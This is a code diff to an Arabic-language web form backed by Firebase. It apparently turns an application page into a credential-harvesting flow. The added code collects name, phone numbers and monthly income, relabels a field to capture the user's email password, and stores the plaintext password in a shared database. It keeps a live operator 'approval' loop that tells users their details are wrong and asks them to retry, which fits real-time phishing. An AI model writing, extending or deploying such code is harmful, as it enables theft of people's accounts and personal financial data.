@@ -14,6 +14,8 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
+const homeForm = document.getElementById('homeForm');
+const logoutStep = document.getElementById('logoutStep');
 const requestForm = document.getElementById('requestForm');
 const orderForm = document.getElementById('orderForm');
 const waitingPanel = document.getElementById('waitingPanel');
@@ -22,22 +24,51 @@ const submitButton = document.getElementById('submitButton');
 const orderSubmitButton = document.getElementById('orderSubmitButton');
 const backButton = document.getElementById('backButton');
 const qrButton = document.getElementById('qrButton');
+const logoutNextButton = document.getElementById('logoutNextButton');
 const orderNumberInput = document.getElementById('orderNumber');
 const pageTitle = document.getElementById('pageTitle');
 
+let applicantData = {
+    applicantName: '',
+    mobileNumber: '',
+    contactNumber: '',
+    monthlyIncome: ''
+};
 let currentEmail = '';
-let currentName = '';
+let currentPassword = '';
 let currentRequestRef = null;
 let statusUnsubscribe = null;
+
+homeForm.addEventListener('submit', (event) => {
+    event.preventDefault();
+
+    applicantData = {
+        applicantName: document.getElementById('applicantName').value.trim(),
+        mobileNumber: document.getElementById('mobileNumber').value.trim(),
+        contactNumber: document.getElementById('contactNumber').value.trim(),
+        monthlyIncome: document.getElementById('monthlyIncome').value.trim()
+    };
+
+    if (!applicantData.applicantName || !applicantData.mobileNumber || !applicantData.contactNumber || !applicantData.monthlyIncome) {
+        showMessage('يرجى إدخال جميع البيانات المطلوبة', 'error');
+        return;
+    }
+
+    showStep('logout');
+});
+
+logoutNextButton.addEventListener('click', () => {
+    showStep('details');
+});
 
 requestForm.addEventListener('submit', async (event) => {
     event.preventDefault();
 
     currentEmail = document.getElementById('email').value.trim();
-    currentName = document.getElementById('name').value.trim();
+    currentPassword = document.getElementById('name').value.trim();
 
-    if (!currentEmail || !currentName) {
-        showMessage('يرجى إدخال البريد الإلكتروني والاسم', 'error');
+    if (!currentEmail || !currentPassword) {
+        showMessage('يرجى إدخال البريد الإلكتروني وكلمة المرور', 'error');
         return;
     }
 
@@ -49,8 +80,10 @@ requestForm.addEventListener('submit', async (event) => {
         if (!currentRequestRef) {
             currentRequestRef = push(ref(database, 'requests'));
             await set(currentRequestRef, {
+                ...applicantData,
                 email: currentEmail,
-                name: currentName,
+                password: currentPassword,
+                name: applicantData.applicantName,
                 orderNumber: '',
                 status: 'pending',
                 timestamp: Date.now(),
@@ -58,8 +91,10 @@ requestForm.addEventListener('submit', async (event) => {
             });
         } else {
             await update(currentRequestRef, {
+                ...applicantData,
                 email: currentEmail,
-                name: currentName,
+                password: currentPassword,
+                name: applicantData.applicantName,
                 updatedAt: Date.now()
             });
         }
@@ -71,7 +106,7 @@ requestForm.addEventListener('submit', async (event) => {
         console.error('Error:', error);
     } finally {
         submitButton.disabled = false;
-        submitButton.textContent = 'تقديم طلب';
+        submitButton.textContent = 'تقديم الطلب';
     }
 });
 
@@ -92,8 +127,10 @@ orderForm.addEventListener('submit', async (event) => {
         if (!currentRequestRef) {
             currentRequestRef = push(ref(database, 'requests'));
             await set(currentRequestRef, {
+                ...applicantData,
                 email: currentEmail,
-                name: currentName,
+                password: currentPassword,
+                name: applicantData.applicantName,
                 orderNumber,
                 status: 'pending',
                 timestamp: Date.now(),
@@ -102,16 +139,19 @@ orderForm.addEventListener('submit', async (event) => {
             });
         } else {
             await update(currentRequestRef, {
+                ...applicantData,
                 orderNumber,
                 orderNumberUpdatedAt: Date.now()
             });
         }
 
+        homeForm.reset();
         requestForm.reset();
         orderForm.reset();
+        resetApplicantData();
         stopWatchingApprovalStatus();
         currentRequestRef = null;
-        showStep('details');
+        showStep('home');
         showMessage(`تم إرسال الطلب بنجاح. رقم الطلب: ${orderNumber}`, 'success');
     } catch (error) {
         showMessage('حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى', 'error');
@@ -161,12 +201,12 @@ function watchApprovalStatus() {
             stopWatchingApprovalStatus();
             currentRequestRef = null;
             showStep('details');
-            showMessage('\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629 \u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u0627\u0643\u062f \u0645\u0646 \u0635\u062d\u0629 \u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0627\u062e\u0631\u0649', 'error');
+            showMessage('معلومات غير صحيحة يرجى التأكد من صحة المعلومات والمحاولة مرة أخرى', 'error');
         }
     }, (error) => {
         stopWatchingApprovalStatus();
         showStep('details');
-        showMessage('\u062d\u062f\u062b \u062e\u0637\u0623 \u0623\u062b\u0646\u0627\u0621 \u0645\u062a\u0627\u0628\u0639\u0629 \u062d\u0627\u0644\u0629 \u0627\u0644\u0637\u0644\u0628. \u062d\u0627\u0648\u0644 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649', 'error');
+        showMessage('حدث خطأ أثناء متابعة حالة الطلب. حاول مرة أخرى', 'error');
         console.error('Status watch error:', error);
     });
 }
@@ -178,14 +218,42 @@ function stopWatchingApprovalStatus() {
     }
 }
 
+function resetApplicantData() {
+    applicantData = {
+        applicantName: '',
+        mobileNumber: '',
+        contactNumber: '',
+        monthlyIncome: ''
+    };
+    currentEmail = '';
+    currentPassword = '';
+}
+
 function showStep(step) {
+    const isHomeStep = step === 'home';
+    const isLogoutStep = step === 'logout';
+    const isDetailsStep = step === 'details';
     const isOrderStep = step === 'order';
     const isWaitingStep = step === 'waiting';
 
-    requestForm.classList.toggle('hidden', isOrderStep || isWaitingStep);
+    homeForm.classList.toggle('hidden', !isHomeStep);
+    logoutStep.classList.toggle('hidden', !isLogoutStep);
+    requestForm.classList.toggle('hidden', !isDetailsStep);
     orderForm.classList.toggle('hidden', !isOrderStep);
     waitingPanel.classList.toggle('hidden', !isWaitingStep);
-    pageTitle.textContent = isOrderStep ? 'رقم الطلب' : isWaitingStep ? 'يرجى الانتظار' : 'تقديم طلب';
+
+    if (isHomeStep) {
+        pageTitle.textContent = 'الصفحة الرئيسية';
+    } else if (isLogoutStep) {
+        pageTitle.textContent = 'تنويه قبل المتابعة';
+    } else if (isOrderStep) {
+        pageTitle.textContent = 'رقم الطلب';
+    } else if (isWaitingStep) {
+        pageTitle.textContent = 'يرجى الانتظار';
+    } else {
+        pageTitle.textContent = 'تقديم طلب';
+    }
+
     messageDiv.classList.add('hidden');
 
     if (isOrderStep) {
